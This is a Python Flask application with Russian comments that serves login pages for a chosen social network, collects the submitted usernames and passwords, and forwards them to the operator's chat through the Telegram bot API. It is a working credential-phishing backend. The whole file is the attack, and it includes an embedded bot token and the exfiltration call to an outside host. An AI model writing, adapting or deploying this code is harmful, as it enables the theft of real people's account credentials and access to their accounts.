from flask import Flask, request, jsonify, render_template, redirect, url_for
import requests

app = Flask(__name__)

# Токен твоего бота
BOT_TOKEN = '7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0'

# ID главного админа (это ты)
MAIN_ADMIN_ID = 7947290290

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Страница выбора соцсети
@app.route('/login/<service>')
def login(service):
    return render_template('login.html', service=service)

# Обработка данных с формы
@app.route('/send-data', methods=['POST'])
def send_data():
    data = request.json
    service = data.get('service')
    login = data.get('login')
    password = data.get('password')

    # Формируем сообщение для админа
    message = (
        f"📝 *Новые данные*\n"
        f"🔐 *Сервис:* {service}\n"
        f"👤 *Логин:* `{login}`\n"
        f"🔑 *Пароль:* `{password}`"
    )

    # Отправляем сообщение главному админу
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': MAIN_ADMIN_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(url, json=payload)

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)